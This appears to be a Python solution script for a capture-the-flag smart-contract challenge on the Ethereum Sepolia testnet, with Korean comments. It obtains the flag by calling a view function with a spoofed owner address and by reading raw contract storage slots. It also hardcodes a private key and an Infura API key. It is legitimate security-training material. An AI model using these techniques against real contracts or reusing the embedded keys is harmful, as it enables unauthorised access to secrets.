from web3 import Web3
import requests
import json

# 풀이
# 1. 솔리디티의 public 변수는 선언과 동시에 getter, setter 함수가 동시에 선언된다는 점을 이용하여
#    getter 함수 (call()) 을 이용하여 컨트랙트 Onwer의 주소 정보 확인
# 2. 1번에서 확인한 주소정보를 이용하여 opensafe 함수를 호출하는 시점에서 from: 에 해당 데이터를 넣고
#    스마트 컨트랙트를 호출해서 플래그 획득

# 문제에서 사용하는 각종 정보 추출
PROB_URL = "http://host1.dreamhack.games:19734"
RPC_URL = "https://sepolia.infura.io/v3/5a182f472a374f20ba4a6a017230aca5"

CONTRACT_ADDRESS_KEYWORD = "const ADDRESS = \""

resp = requests.get(PROB_URL)

IDX = resp.text.find(CONTRACT_ADDRESS_KEYWORD) + len(CONTRACT_ADDRESS_KEYWORD)

CONTRACT_ADDRESS = resp.text[IDX : IDX + 42]
USER_PRIV_KEY = "0x0c9ca3de08698e455e30266085e8fcd6b41d604941abbd92f574cec53144a1bd"
USER_ADDRESS = "0xC25ae1Db77B06d234eD406F47e6A9B6A3C3C1d98"
OWNER_ADDRESS = ""

# 스마트 컨트랙트 ABI 설정
ABI = [
    {
            "inputs": [
                {
                        "internalType": "address",
                        "name": "_owner",
                        "type": "address"
                }
            ],
            "name": "changeOwner",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
    },
    {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
    },
    {
            "inputs": [],
            "name": "opensafe",
            "outputs": [
                {
                        "internalType": "string",
                        "name": "",
                        "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
    },
    {
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
    }
]

# 스마트 컨트랙트 연결
web3 = Web3(Web3.HTTPProvider(RPC_URL))

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

# owner 변수의 getter를 호출하여 Owner의 사용자 주소 확인
OWNER_ADDRESS = contract.functions.owner().call()

# 답안 1.
# 확인한 데이터로 FLAG 호출
FLAG = contract.functions.opensafe().call({'from': OWNER_ADDRESS})

print(FLAG)

# 답안 2.
# 숫자 1에 대한 SHA3 해시 구하기
UINT256_One_SHA3 = web3.solidity_keccak(['uint256'], [1])

# 숫자 1에 대한 SHA3 해시를 16진수 문자열로 변환
UINT256_One_SHA3_to_HEXSTR = "0x" + UINT256_One_SHA3.hex()

# 구한 해시 바이트 배열을 부호없는 정수로 변환한 값에 +1 한 값을 다시 SHA3 해시 문자열로 변환
# (솔리디티는 빅엔디안 방식 사용)
UINT256_One_SHA3_plus_One_to_HEXSTR = (int.from_bytes(UINT256_One_SHA3, byteorder="big") + 1).to_bytes(len(UINT256_One_SHA3), 'big', signed=False).hex()

# 1번 읽어올때 32바이트씩 읽어옴
FLAG01 = web3.eth.get_storage_at(CONTRACT_ADDRESS, UINT256_One_SHA3_to_HEXSTR)

# 플래그의 길이는 32바이트가 넘어가므로 첫번째 호출한 해시에서 +1한 값으로 두번째 호출
FLAG02 = web3.eth.get_storage_at(CONTRACT_ADDRESS, UINT256_One_SHA3_plus_One_to_HEXSTR)

print(FLAG01)
print(FLAG02)

print(FLAG01 + FLAG02)